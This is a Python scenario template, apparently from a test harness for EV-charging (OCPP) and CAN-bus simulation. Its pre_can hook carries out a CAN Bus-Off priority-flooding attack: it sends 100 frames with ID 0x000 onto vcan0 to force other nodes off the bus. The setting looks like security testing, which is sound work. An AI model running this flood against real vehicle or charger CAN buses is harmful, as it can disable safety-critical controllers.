from infra.scenario_base import ScenarioHooks

class Scenario(ScenarioHooks):
    """
    Base template for creating a scenario.
    
    HOW TO USE:
    - Override only the hooks you need.
    - Do NOT modify pipeline.py or ocpp_client.py.
    - Return modified data when needed.
    - Return None from pre_can() to DROP a CAN frame.
    """

    def pre_ocpp(self, action, payload):
        # Example:
        # self.log(f"pre_ocpp called for action={action}")
        return action, payload

    def post_ocpp(self, action, payload, reply):
        # Example:
        # self.log(f"post_ocpp reply={reply}")
        return reply

    async def pre_can(self, can_frame):
        """
        Attack: CAN Bus-Off (Priority Flooding).
        Injects a burst of high-priority (ID 0x000) frames to flood the bus
        and force other nodes into Bus-Off state.
        """
        try:
            # Connect to vcan0 independently to inject frames
            bus = can.interface.Bus(channel='vcan0', interface='socketcan')
            
            # Create a high-priority "Attack Frame"
            # ID = 0x000 (Dominant)
            attack_msg = can.Message(
                arbitration_id=0x000,
                data=[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
                is_extended_id=False
            )

            # FLOODING: Send 100 frames rapidly
            FLOOD_COUNT = 100
            for _ in range(FLOOD_COUNT):
                bus.send(attack_msg)
            
            self.log(f"⚔ ATTACK: Injected {FLOOD_COUNT} high-priority frames (ID 0x000)!")

        except Exception as e:
            self.log(f"Error during attack injection: {e}")

        # Return original frame unchanged (let it pass, or drop it if desired)
        return can_frame

    def post_can(self, can_frame):
        pass
